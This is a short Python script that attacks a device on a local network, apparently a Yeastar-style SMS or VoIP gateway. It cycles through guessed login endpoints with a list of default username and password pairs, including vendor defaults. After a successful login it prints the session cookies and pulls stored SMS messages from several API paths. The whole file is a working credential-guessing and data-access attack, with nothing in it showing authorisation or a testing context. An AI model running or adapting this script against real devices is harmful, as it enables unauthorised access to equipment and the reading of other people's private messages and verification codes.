import requests

host = "192.168.1.55"

# Start a session to maintain cookies
session = requests.Session()

# First, get the main page to get any CSRF tokens
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
}
response = session.get(f"http://{host}", headers=headers)
print("Main page loaded")

# Try common login endpoints
login_endpoints = [
    f"http://{host}/cgi/API",
    f"http://{host}/api/login",
    f"http://{host}/login",
    f"http://{host}/admin/login",
    f"http://{host}/cgi/login",
]

# Try different credentials
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "iyeastar"),
    ("admin", ""),
    ("support", "iyeastar"),
]

for endpoint in login_endpoints:
    print(f"\nTrying endpoint: {endpoint}")
    
    for username, password in credentials:
        # Try POST with form data
        login_data = {
            'username': username,
            'password': password,
            'action': 'login'
        }
        
        try:
            response = session.post(endpoint, data=login_data, timeout=5)
            
            if response.status_code == 200:
                print(f"  ✓ {username}:{password} - Status 200")
                print(f"    Response preview: {response.text[:200]}")
                
                # Check if login was successful (look for session cookie or success message)
                if 'success' in response.text.lower() or 'session' in str(session.cookies):
                    print(f"    ✓ LOGIN SUCCESSFUL with {username}:{password}!")
                    print(f"    Cookies: {session.cookies.get_dict()}")
                    
                    # Try to get SMS after login
                    sms_endpoints = [
                        f"http://{host}/cgi/API?action=getSMS",
                        f"http://{host}/api/sms",
                        f"http://{host}/cgi/get_sms",
                    ]
                    
                    for sms_url in sms_endpoints:
                        sms_response = session.get(sms_url)
                        if sms_response.status_code == 200:
                            print(f"\n    SMS from {sms_url}:")
                            print(f"    {sms_response.text[:500]}")
                    
                    break
            else:
                print(f"  ✗ {username}:{password} - {response.status_code}")
                
        except Exception as e:
            print(f"  ✗ {username}:{password} - Error: {e}")